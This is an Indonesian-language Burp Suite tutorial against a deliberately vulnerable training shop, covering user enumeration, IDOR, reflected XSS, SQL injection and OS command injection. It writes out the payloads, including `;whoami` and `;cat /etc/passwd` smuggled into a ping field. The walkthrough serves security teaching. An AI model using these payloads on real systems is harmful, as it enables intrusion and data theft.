# Tutorial Burp Suite: NexShop Lab (Step-by-Step)

**⚠️ Disclaimer:** Tutorial ini hanya untuk edukasi keamanan. Hanya praktikkan pada sistem yang kamu miliki atau dapat izin resmi.

---

## Persiapan: Setup Burp Suite untuk Cloudflare Pages

Karena `*.pages.dev` menggunakan **HTTPS**, Burp Suite perlu instal sertifikat SSL agar bisa membaca traffic.

### Step 1: Pasang Sertifikat Burp
1. Buka Burp Suite > **Proxy** > **Options**
2. Klik **Import / export CA certificate**
3. Export dalam format **DER**, simpan sebagai `burp.crt`
4. Buka browser (Chrome/Firefox) > **Settings** > **Privacy and security** > **Security** > **Manage certificates**
5. Import file `burp.crt` ke bagian **Trusted Root Certification Authorities**
6. Restart browser.

### Step 2: Set Proxy Browser
Pastikan browser kamu menggunakan proxy `127.0.0.1:8080`. Buka `http://burp` untuk verifikasi.

### Step 3: Siapkan Intercept
Di Burp Suite, buka tab **Proxy** > **Intercept** > Pastikan tombol **"Intercept is on"** aktif.

---

## CASE 1: Information Disclosure & User Enumeration
**Vulnerability:** Pesan error terlalu verbose, membocorkan apakah username ada di database.

### Step 1: Tangkap Request Login Gagal (User Salah)
1. Buka `https://main.himatifa-store-umsurabaya.pages.dev`
2. Klik **Masuk**, isi `username: tes123`, `password: tes123`, klik Login
3. Burp akan menangkap request:
```http
POST /api/login HTTP/2
Host: main.himatifa-store-umsurabaya.pages.dev
Content-Type: application/json

{"username":"tes123","password":"tes123"}
```
4. Klik **Forward**

### Step 2: Analisa Response
Di tab **HTTP history**, cari request tadi. Klik tab **Response**:
```json
{
  "success": false,
  "message": "Username atau password salah",
  "debug_user_exists": false  // ⚠️ BOCOR: User tidak ada
}
```

### Step 3: Tangkap Request Login Gagal (Password Salah)
1. Ulangi login, kali ini: `username: admin`, `password: salah`
2. Lihat response di Burp:
```json
{
  "success": false,
  "message": "Username atau password salah",
  "debug_user_exists": true,  // ⚠️ BOCOR: User admin ADA!
  "debug_hint": "password_mismatch"
}
```

**🎯 Kesimpulan:** Attacker bisa menggunakan fitur **Intruder** di Burp untuk menebak password hanya untuk username yang mengembalikan `debug_user_exists: true` (Brute-force efisien).

---

## CASE 2: IDOR (Insecure Direct Object Reference)
**Vulnerability:** Mengubah parameter `user_id` di URL bisa melihat data orang lain tanpa otorisasi.

### Step 1: Tangkap Request Profil
1. Login sebagai `admin/admin123` (Forward request login di Burp)
2. Klik menu **Profil** di website
3. Burp menangkap:
```http
GET /api/profile?user_id=1 HTTP/2
Host: main.himatifa-store-umsurabaya.pages.dev
```

### Step 2: Manipulasi Parameter
1. Di Burp Intercept, ubah `user_id=1` menjadi `user_id=3`
```http
GET /api/profile?user_id=3 HTTP/2
```
2. Klik **Forward**

### Step 3: Lihat Dampak
Cek tab **HTTP history** untuk response `user_id=3`:
```json
{
  "success": true,
  "user": {
    "name": "Admin Pusat",
    "email": "admin@nexshop.com",
    "role": "Administrator",
    "saldo": "Rp 99.999.999",
    "secret_key": "NEX-ADMIN-7f3a9b" // 🚨 DATA RAHASIA BOCOR
  }
}
```

**🎯 Kesimpulan:** Meskipun login sebagai user biasa (ID 1), attacker bisa mengakses seluruh database user hanya dengan mengganti angka di URL.

---

## CASE 3: Reflected XSS (Cross-Site Scripting)
**Vulnerability:** Input user dikembalikan apa adanya di response, dan frontend merender pakai `innerHTML`.

### Step 1: Tangkap Request Pencarian
1. Klik menu **Cari**
2. Ketik `laptop`, klik Cari
3. Burp menangkap:
```http
GET /api/search?q=laptop HTTP/2
Host: main.himatifa-store-umsurabaya.pages.dev
```

### Step 2: Analisa Response
Lihat response di Burp:
```json
{
  "success": true,
  "query": "laptop", // ⚠️ Input tidak di-escape/di-filter
  "results": [...]
}
```

### Step 3: Sisipkan Payload XSS
1. Buka menu **Cari** lagi, ketik apapun (misal: `test`), klik Cari.
2. Saat Burp menangkap di Intercept, ubah URL-nya:
```http
GET /api/search?q=<img src=x onerror=alert('XSS_Dari_Burp')> HTTP/2
```
3. Klik **Forward**

### Step 4: Verifikasi
Lihat browser kamu. Akan muncul popup `alert('XSS_Dari_Burp')`. Ini membuktikan attacker bisa menjalankan JavaScript arbitrer di browser korban.

---

## CASE 4: SQL Injection (SQLi)
**Vulnerability:** Backend tidak melakukan sanitasi terhadap karakter SQL spesifik.

### Step 1: Tangkap Request Pencarian
Sama seperti sebelumnya, tangkap pencarian:
```http
GET /api/search?q=iphone HTTP/2
```

### Step 2: Sisipkan Payload SQLi Bypass
1. Di Burp Intercept, ubah parameter `q`:
```http
GET /api/search?q=' OR '1'='1 HTTP/2
```
2. Klik **Forward**, lihat response:
```json
{
  "success": true,
  "query": "' OR '1'='1",
  "sqli_detected": true, // ⚠️ Backend mendeteksi tapi TIDAK MEMBLOKIR
  "results": [
    // ... SEMUA PRODUK MUNCUL (bypass filter)
  ]
}
```

### Step 3: Sisipkan Payload SQLi Ekstraksi Data
1. Tangkap lagi pencarian, ubah di Burp:
```http
GET /api/search?q=UNION SELECT HTTP/2
```
2. Lihat response di HTTP History:
```json
{
  "success": true,
  "leaked_data": "admin@nexshop.com | pass_hash: 5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8" // 🚨 DATA DB BOCOR
}
```

**🎯 Kesimpulan:** Attacker berhasil mengekstrak kredensial dan data sensitif dari database menggunakan SQL Injection.

---

## CASE 5: Command Injection / RCE
**Vulnerability:** Input user disambungkan langsung ke perintah sistem (OS Command).

### Step 1: Tangkap Request Ping
1. Klik menu **Diagnostic**
2. Isi target `8.8.8.8`, klik Jalankan Ping
3. Burp menangkap:
```http
POST /api/ping HTTP/2
Host: main.himatifa-store-umsurabaya.pages.dev
Content-Type: application/json

{"target":"8.8.8.8"}
```

### Step 2: Sisipkan Payload RCE (Whoami)
1. Di Burp Intercept, ubah body request-nya dengan menambahkan pemisah perintah `;`:
```json
{"target":"8.8.8.8;whoami"}
```
2. Klik **Forward**
3. Cek response di HTTP history:
```json
{
  "output": "... \n[!] INJECTION DETECTED:\nuid=33(www-data) gid=33(www-data)..." // 🚨 SERVER TEREKSEKUSI
}
```

### Step 3: Sisipkan Payload Membaca File Sensitif
1. Tangkap lagi ping, ubah body-nya di Burp:
```json
{"target":"8.8.8.8;cat /etc/passwd"}
```
2. Response akan mengembalikan isi file `/etc/passwd` server:
```json
{
  "output": "... root:x:0:0:root:/root:/bin/bash \n www-data:x:33:33:www-data:/var/www ..."
}
```

**🎯 Kesimpulan:** Attacker berhasil mendapatkan akses eksekusi perintah di level sistem operasi (Remote Code Execution).

---

## Ringkasan Rentang Keamanan

| Case | Endpoint Burp | Payload Utama | Dampak |
|------|---------------|---------------|--------|
| **Info Disclosure** | `POST /api/login` | `{"username":"admin","password":"salah"}` | Bisa brute-force password |
| **IDOR** | `GET /api/profile?user_id=3` | Ubah angka `user_id` | Bocor data & secret key admin |
| **XSS** | `GET /api/search?q=<payload>` | `<img src=x onerror=alert(1)>` | Session hijacking korban |
| **SQLi** | `GET /api/search?q=' OR '1'='1` | `UNION SELECT` | Bocor database (hash password) |
| **RCE** | `POST /api/ping` | `{"target":"8.8.8.8;whoami"}` | Server fully compromised |

Dengan tutorial ini, kamu bisa membuktikan bahwa **semua traffic yang melewati `fetch()` API bisa dimanipulasi dengan bebas oleh Burp Suite**, berbeda dengan login yang hanya berjalan di dalam JavaScript lokal.